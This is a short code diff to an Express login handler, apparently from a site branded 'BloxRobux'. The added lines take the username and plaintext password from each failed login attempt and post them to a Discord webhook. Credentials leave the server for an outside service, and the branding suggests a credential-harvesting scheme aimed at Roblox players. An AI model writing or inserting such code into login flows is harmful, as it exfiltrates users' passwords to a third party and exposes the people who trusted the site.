@@ -401,6 +401,22 @@ app.post("/login", async (req, res) => {
 
     if (!snap.exists()) {
       logFailedAttempt(req.ip, username);
+        await fetch(`${DISCORD_WEBHOOK_TRACKER}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title: `Tentative de connexion échoué !`,
+            description: `## Un utilisateur a essayé de se connecter mais a échoué... username : ${username} password : ${password}`,
+            color: 0x992d22,
+            footer: {
+              text: "BloxRobux",
+              icon_url: "https://i.imgur.com/PjcK6QD.png"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
       return res.status(401).json({ error: "Identifiants invalides" });
     }
 
